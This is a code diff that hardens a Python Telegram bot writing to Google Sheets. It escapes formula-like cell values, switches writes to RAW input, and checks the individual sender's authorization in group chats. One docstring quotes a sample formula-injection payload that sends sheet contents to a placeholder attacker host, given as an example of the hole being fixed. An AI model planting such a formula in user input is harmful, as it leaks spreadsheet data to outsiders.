@@ -209,6 +209,25 @@ def normalize_space(value):
     return re.sub(r"\s+", " ", str(value or "").replace("\xa0", " ")).strip()
 
 
+SHEET_FORMULA_PREFIXES = ("=", "+", "-", "@")
+
+
+def sheet_safe_text(value):
+    """Neutralize spreadsheet formula injection before writing user text to Sheets.
+
+    Google Sheets evaluates any cell starting with = + - @ (or a control character
+    followed by one of them). A user-supplied name such as
+    ``=IMPORTXML("https://attacker/"&A1)`` would otherwise execute on open and can
+    exfiltrate the sheet. Writes also use valueInputOption=RAW; this is defence in
+    depth for the case where a cell is later copied into a formula-evaluating tool.
+    """
+    text = str(value or "")
+    stripped = text.lstrip("\t\r\n ")
+    if stripped[:1] in SHEET_FORMULA_PREFIXES:
+        return "'" + text
+    return text
+
+
 def normalize_header(value):
     return normalize_space(value).casefold()
 
@@ -576,6 +595,41 @@ def admin_chat_ids():
 
 def is_admin_chat_id(chat_id):
     return str(chat_id).strip() in admin_chat_ids()
+
+
+def is_group_chat(chat):
+    return str((chat or {}).get("type", "")).strip().lower() in {"group", "supergroup", "channel"}
+
+
+def actor_ids(chat, from_user):
+    """Return (chat_id, user_id) for an incoming update.
+
+    Telegram sends both the chat the update happened in and the user who caused it.
+    They are the same value in a private chat but differ in a group, so both are
+    needed to make a correct authorization decision.
+    """
+    chat_id = (chat or {}).get("id")
+    user_id = (from_user or {}).get("id")
+    if chat_id is None:
+        chat_id = user_id
+    return chat_id, user_id
+
+
+def is_authorized_actor(chat, from_user, allowed_check):
+    """Authorize an update by chat AND, in groups, by the acting user.
+
+    Checking only ``message.chat.id`` is unsafe: if an allow-listed id happens to be
+    a group, every member of that group inherits the permission. In a group we
+    therefore also require the individual sender to be allow-listed.
+    """
+    chat_id, user_id = actor_ids(chat, from_user)
+    if chat_id is None:
+        return False
+    if not allowed_check(chat_id):
+        return False
+    if is_group_chat(chat):
+        return user_id is not None and allowed_check(user_id)
+    return True
 
 
 def known_service_chat_ids(sheets, state=None):
@@ -1940,11 +1994,13 @@ def handle_admin_callback(args, sheets, state, callback):
     callback_id = callback.get("id")
     message = callback.get("message") or {}
     chat = message.get("chat") or {}
-    chat_id = chat.get("id") or (callback.get("from") or {}).get("id")
+    from_user = callback.get("from") or {}
+    chat_id, _user_id = actor_ids(chat, from_user)
     data = callback.get("data") or ""
     if not data.startswith("dbg:"):
         return False
-    if not is_admin_chat_id(chat_id):
+    if not is_authorized_actor(chat, from_user, is_admin_chat_id):
+        log("Админ-callback отклонен: chat_id={}, user_id={}, data={}".format(chat_id, from_user.get("id"), data))
         answer_callback(args, callback_id, "Нет доступа")
         return False
     answer_callback(args, callback_id)
@@ -2011,12 +2067,13 @@ def handle_admin_message(args, sheets, state, message):
     if args.no_admin_buttons:
         return False
     chat = message.get("chat") or {}
-    chat_id = chat.get("id")
+    from_user = message.get("from") or {}
+    chat_id, user_id = actor_ids(chat, from_user)
     text = normalize_space(message.get("text") or "")
     if not text or not text.startswith("/"):
         return False
-    if not is_admin_chat_id(chat_id):
-        log("Команда от не-админа: chat_id={}, text={}".format(chat_id, text))
+    if not is_authorized_actor(chat, from_user, is_admin_chat_id):
+        log("Команда от не-админа: chat_id={}, user_id={}, text={}".format(chat_id, user_id, text.split()[0]))
         return False
     command = text.split()[0].split("@", 1)[0].lower()
     if is_user_mode_chat(state, chat_id) and command in {"/start", "/add", "/plaque", "/cancel"}:
@@ -2445,11 +2502,11 @@ class GoogleRestWorksheet:
         url = "https://sheets.googleapis.com/v4/spreadsheets/{}/values/{}:clear".format(urllib.parse.quote(self.spreadsheet.id), encoded_range)
         return self.spreadsheet.client.request("POST", url, {})
 
-    def update(self, values, value_input_option="USER_ENTERED"):
+    def update(self, values, value_input_option="RAW"):
         url = self.values_url("{}!A1".format(a1_quote_sheet_title(self.title)), {"valueInputOption": value_input_option})
         return self.spreadsheet.client.request("PUT", url, {"range": "{}!A1".format(a1_quote_sheet_title(self.title)), "majorDimension": "ROWS", "values": values})
 
-    def batch_update(self, updates, value_input_option="USER_ENTERED"):
+    def batch_update(self, updates, value_input_option="RAW"):
         url = "https://sheets.googleapis.com/v4/spreadsheets/{}/values:batchUpdate".format(urllib.parse.quote(self.spreadsheet.id))
         sheet_prefix = a1_quote_sheet_title(self.title)
         data = []
@@ -2629,7 +2686,7 @@ def ensure_worksheet(spreadsheet, title, rows=100, cols=20):
 def table_values(fieldnames, rows):
     values = [list(fieldnames)]
     for row in rows:
-        values.append([str(row.get(field, "")) for field in fieldnames])
+        values.append([sheet_safe_text(row.get(field, "")) for field in fieldnames])
     return values
 
 
@@ -2640,7 +2697,7 @@ def write_ae_records_to_spreadsheet(spreadsheet, records):
         values = table_values(fields, rows)
         run_google_action("Не удалось очистить лист {}".format(title), worksheet.clear)
         if values:
-            run_google_action("Не удалось записать лист {}".format(title), lambda worksheet=worksheet, values=values: worksheet.update(values, value_input_option="USER_ENTERED"))
+            run_google_action("Не удалось записать лист {}".format(title), lambda worksheet=worksheet, values=values: worksheet.update(values, value_input_option="RAW"))
 
 
 def session_shift_by_day():
@@ -2934,9 +2991,9 @@ def write_plaque_to_sheet(name, position, note_text=PLAQUE_NOTE_TEXT, worksheet=
     )
     row_index, action = find_plaque_row(values, name)
     updates = [
-        {"range": "{}{}".format(column_letter(PLAQUE_NAME_COL), row_index), "values": [[name]]},
-        {"range": "{}{}".format(column_letter(PLAQUE_POSITION_COL), row_index), "values": [[position]]},
-        {"range": "{}{}".format(column_letter(PLAQUE_NOTE_COL), row_index), "values": [[note_text]]},
+        {"range": "{}{}".format(column_letter(PLAQUE_NAME_COL), row_index), "values": [[sheet_safe_text(name)]]},
+        {"range": "{}{}".format(column_letter(PLAQUE_POSITION_COL), row_index), "values": [[sheet_safe_text(position)]]},
+        {"range": "{}{}".format(column_letter(PLAQUE_NOTE_COL), row_index), "values": [[sheet_safe_text(note_text)]]},
     ]
     log("Запись плашки: spreadsheet={}, worksheet='{}' gid={}, row={}, action={}, name='{}'".format(
         PLAQUE_SPREADSHEET_ID,
@@ -2946,7 +3003,7 @@ def write_plaque_to_sheet(name, position, note_text=PLAQUE_NOTE_TEXT, worksheet=
         action,
         name,
     ))
-    run_google_action("Не удалось записать плашку в Google Sheets", lambda: worksheet.batch_update(updates, value_input_option="USER_ENTERED"))
+    run_google_action("Не удалось записать плашку в Google Sheets", lambda: worksheet.batch_update(updates, value_input_option="RAW"))
     verified = (
         verify_plaque_row(worksheet, row_index, name, position, note_text=note_text)
         if verify
@@ -3174,18 +3231,22 @@ def handle_plaque_callback(args, sheets, state, callback):
     callback_id = callback.get("id")
     message = callback.get("message") or {}
     chat = message.get("chat") or {}
-    chat_id = chat.get("id") or (callback.get("from") or {}).get("id")
+    from_user = callback.get("from") or {}
+    chat_id, _user_id = actor_ids(chat, from_user)
     data = callback.get("data") or ""
     if not data.startswith("plq:"):
         return False
-    if data == "plq:admin_panel" and is_admin_chat_id(chat_id):
+    if data == "plq:admin_panel":
+        if not is_authorized_actor(chat, from_user, is_admin_chat_id):
+            answer_callback(args, callback_id, "Нет доступа")
+            return True
         answer_callback(args, callback_id)
         set_user_mode_chat(state, chat_id, False)
         clear_plaque_session(state, chat_id)
         send_debug_menu(args, chat_id, sheets, state)
         return True
-    if not can_use_plaque_form(sheets, state, chat_id):
-        answer_callback(args, callback_id, "Форма доступна новым пользователям")
+    if not is_authorized_actor(chat, from_user, lambda value: can_use_plaque_form(sheets, state, value)):
+        answer_callback(args, callback_id, "Нет доступа к форме плашек")
         return True
     answer_callback(args, callback_id, "Записываю..." if data == "plq:confirm" else "Готово")
     if data == "plq:start":
